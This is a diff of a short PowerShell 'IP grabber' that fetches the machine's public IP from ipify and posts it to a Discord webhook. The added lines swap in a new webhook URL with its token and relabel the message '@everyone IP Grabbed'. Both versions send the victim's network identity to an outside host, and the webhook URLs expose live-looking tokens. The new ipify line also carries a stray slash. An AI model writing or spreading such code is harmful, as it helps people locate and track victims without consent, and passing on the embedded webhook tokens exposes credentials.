@@ -1,8 +1,8 @@
-$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
-$webhookUrl = "https://discord.com/api/webhooks/1389819264604569600/h2DDTTU2vhk4U12E7yzuE5miyvtzKUJLrOJVsUz970u0aEiNNVfKp8nO-RD_lniOvgoW"
+$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org"/)
+$webhookUrl = "https://discord.com/api/webhooks/1393282038219669607/aaxKUcoisulTy_UD7dW7kuCWkMlYtdED4xPDQ2w0tnrbykYOA0u5TfjzoAjASnuNxUQz"
 
 $body = @{
-    content = "User's public IP: $publicIP"
+    content = "@everyone IP Grabbed: $publicIP"
 } | ConvertTo-Json
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" 
